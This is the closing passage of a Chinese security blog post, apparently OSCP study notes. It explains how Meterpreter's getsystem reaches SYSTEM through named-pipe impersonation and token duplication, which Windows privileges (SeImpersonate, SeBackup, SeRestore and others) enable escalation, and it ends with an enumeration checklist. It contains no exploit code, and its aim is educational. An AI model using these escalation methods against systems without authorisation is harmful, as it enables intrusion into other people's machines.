+<p>pipe管道技术在windows和linux中经常使用，比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstrWindows</span><br></pre></td></tr></table></figure>
+
+<p>命名管道是这种技术的扩展<br>一个进程可以创建一个命名管道，其他进程可以打开管道从中读取或写入数据<br>创建命名管道的进程可模拟连接到命名管道的安全上下文</p>
+<p>接着我们开始分析meterpreter的getsystem命令具体是怎么实现的<br>首先它的源码(<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-payloads/tree/d672097e9989e0b4caecfad08ca9debc8e50bb0c/c/meterpreter/source/extensions/priv">https://github.com/rapid7/metasploit-payloads/tree/d672097e9989e0b4caecfad08ca9debc8e50bb0c/c/meterpreter/source/extensions/priv</a>)<br>最值得关注的是elevate.c, namedpipe.c, tokendup.c。它们使用了3种不同得技术获取system</p>
+<p><strong>Named Pipe Impersonation (In Memory/Admin)</strong><br>创建由meterpreter控制的命名管道<br>创建一个服务(以SYSTEM身份运行)，该服务的命令直接与命名管道交互<br>接着，meterpreter模拟连接进程去获取ImpersonationAccess Token(这里就是SYSTEM的安全上下文)<br>最后，将令牌分配给后续的meterpreter程序，这意味着它们会以SYSTEM身份运行</p>
+<p><strong>Named Pipe Impersonation (Dropper/Admin)</strong><br>与上一种方法非常类似。唯一的不同是写了一个DLL在磁盘中，创建的服务加载DLL以SYSTEM身份运行。DLL连接到命名管道</p>
+<p><strong>Token Duplication (In Memory/Admin)</strong><br>这个技术需要SeDebugPrivilege。它寻找任何以SYSTEM身份运行的服务，并进行DLL注入<br>DLL会复制访问令牌会将其分配给meterpreter。目前，这种技术只适用于x86架构<br>这种唯一不需要创建服务完全在内存中运行的技术</p>
+<p>Meterpreter的getsystem功能本身是将本地管理员升级到SYSTEM的一个工具<br>命名管道技术需要本地管理员权限<br>复制令牌技术需要SeDebugPrivilege权限，并且只适用于x86架构</p>
+<p>所以getsystem功能不是让你在<strong>现代操作系统</strong>中从User权限提升到Admin权限</p>
+<h3 id="User-Privileges"><a href="#User-Privileges" class="headerlink" title="User Privileges"></a>User Privileges</h3><p>在windows中可以为账户和组分配一些特别的权限。这些权限可以让你拥有一些功能的访问权限。其中一些功能有助于获取SYSTEM权限</p>
+<p>使用该命令检查，而且需要特别注意，在这里<code>disabled</code>无关紧要。这里只有列了出来，那么你就拥有该权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure>
+
+<p><strong>SeImpersonatePrivilege</strong></p>
+<p>可以获得任何程序的access token，如果从SYSTEM中盗取了令牌，则可以使用它生成一个新的进程。<br>juicy potato可以使用它</p>
+<p><strong>SeAssignPrimaryPrivilege</strong></p>
+<p>与SeImpersonatePrivilege类似，使用户能够将访问令牌分配给新进程<br>juicy potato可以使用它</p>
+<p><strong>SeBackupPrivilege</strong></p>
+<p>获取系统上所有对象的read权限，无视ACL<br>有了它，我们可以尝试访问敏感文件或从注册表中提权哈希，用于哈希破解或哈希传递</p>
+<p><strong>SeRestorePrivilege</strong></p>
+<p>获取系统上所有对象的write权限，无视ACL<br>这给我们更多的操作空间，比如<br>修改服务的二进制文件<br>覆盖系统程序的DLL文件<br>修改注册表设置</p>
+<p><strong>SeTakeOwnershipPrivilege</strong></p>
+<p>让用户获取一个对象的所有权(即<code>WRITE_OWNER</code>权限)<br>一旦获取了某个对象，你就可以修改它的ACL来授予自己写权限等，这样你就可以和SeRestorePrivilege一样的手段来尝试提权</p>
+<p><strong>SeLoadDriverPrivilege</strong></p>
+<p>参考HTB:Fuse</p>
+<p>其他一些可以更高级进行提权的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">•SeTcbPrivilege</span><br><span class="line">•SeCreateTokenPrivilege</span><br><span class="line">•SeDebugPrivilege(used by getsystem)147</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>永恒不变的道理<code>enumeration is the key</code></p>
+<p>首先检查的第一件事应该是账户时谁，它属于哪一个组<br>winpeas枚举，检查每一项被重点标注的选项。但winpeas不是完美的，有时需要尝试其他枚举工具<br>重点是了解手动枚举的方法，在脚本无法正常运行的时候可以突破困境<br>(手动枚举:<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a>)<br>重点检查用户的桌面或其他重点位置(C:\或C:\Program Files)，这些地方可能会存放一些有用的信息<br>仍然没有获得提权，再开始寻找一些第三方程序或者任何看起来奇怪的文件名，甚至是用户名，尝试确认它们的版本并寻找公开漏洞。<br>最后考虑内核提权</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/07/%E9%9D%B6%E5%9C%BAInfoSecPrep%20OSCP/" rel="prev" title="靶场InfoSecPrep OSCP">
+      <i class="fa fa-chevron-left"></i> 靶场InfoSecPrep OSCP
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/09/06/Command-Injection-Bypass/" rel="next" title="Command Injection Bypass">
+      Command Injection Bypass <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#windows%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">windows提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E8%B4%A6%E6%88%B7"><span class="nav-number">1.1.1.</span> <span class="nav-text">普通账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7"><span class="nav-number">1.1.2.</span> <span class="nav-text">服务账户</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84"><span class="nav-number">1.1.3.</span> <span class="nav-text">组</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B5%84%E6%BA%90"><span class="nav-number">1.1.4.</span> <span class="nav-text">资源</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="nav-number">1.2.</span> <span class="nav-text">环境部署</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E9%80%89%E6%8B%A9"><span class="nav-number">1.3.</span> <span class="nav-text">工具选择</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Kernel-Exploits"><span class="nav-number">2.1.</span> <span class="nav-text">Kernel Exploits</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.2.</span> <span class="nav-text">发现与利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">2.1.3.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Services-Exploits"><span class="nav-number">2.2.</span> <span class="nav-text">Services Exploits</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.2.1.</span> <span class="nav-text">手动枚举服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Insecure-Service-Properties"><span class="nav-number">2.2.2.1.</span> <span class="nav-text">Insecure Service Properties</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unquoted-Service-Path"><span class="nav-number">2.2.2.2.</span> <span class="nav-text">Unquoted Service Path</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Weak-Registry-Permissions"><span class="nav-number">2.2.2.3.</span> <span class="nav-text">Weak Registry Permissions</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Insecure-Service-Executables"><span class="nav-number">2.2.2.4.</span> <span class="nav-text">Insecure Service Executables</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DLL-Hijacking"><span class="nav-number">2.2.2.5.</span> <span class="nav-text">DLL Hijacking</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Registry"><span class="nav-number">2.3.</span> <span class="nav-text">Registry</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Autoruns"><span class="nav-number">2.3.1.</span> <span class="nav-text">Autoruns</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AlwaysInstallElevated"><span class="nav-number">2.3.2.</span> <span class="nav-text">AlwaysInstallElevated</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Passwords"><span class="nav-number">2.4.</span> <span class="nav-text">Passwords</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Registry-1"><span class="nav-number">2.4.1.</span> <span class="nav-text">Registry</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Saved-Creds"><span class="nav-number">2.4.2.</span> <span class="nav-text">Saved Creds</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Configuration-Files"><span class="nav-number">2.4.3.</span> <span class="nav-text">Configuration Files</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.3.1.</span> <span class="nav-text">寻找配置文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SAM"><span class="nav-number">2.4.4.</span> <span class="nav-text">SAM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Scheduled-Tasks"><span class="nav-number">2.5.</span> <span class="nav-text">Scheduled Tasks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insecure-GUI-Apps-Citrix-Method"><span class="nav-number">2.6.</span> <span class="nav-text">Insecure GUI Apps (Citrix Method)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Startup-Apps"><span class="nav-number">2.7.</span> <span class="nav-text">Startup Apps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Installed-Applications"><span class="nav-number">2.8.</span> <span class="nav-text">Installed Applications</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="nav-number">2.9.</span> <span class="nav-text">土豆家族</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hot-Potato"><span class="nav-number">2.9.1.</span> <span class="nav-text">Hot Potato</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Service-Accounts-Rotten-Juicy-Potato"><span class="nav-number">2.9.2.</span> <span class="nav-text">Service Accounts (Rotten &#x2F; Juicy Potato)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Port-Forwarding"><span class="nav-number">2.10.</span> <span class="nav-text">Port Forwarding</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%9D%E5%A4%96%E9%83%A8%E5%88%86"><span class="nav-number">3.</span> <span class="nav-text">额外部分</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Meterpreter-gt-getsystem"><span class="nav-number">3.0.1.</span> <span class="nav-text">Meterpreter&gt;getsystem</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-Privileges"><span class="nav-number">3.0.2.</span> <span class="nav-text">User Privileges</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="EvilArsene"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">EvilArsene</p>
+  <div class="site-description" itemprop="description">人格面具操控者</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/TZESS" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;TZESS" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Arsene_IP" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Arsene_IP" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilArsene</span>
+</div>
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2018,02,13,15,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
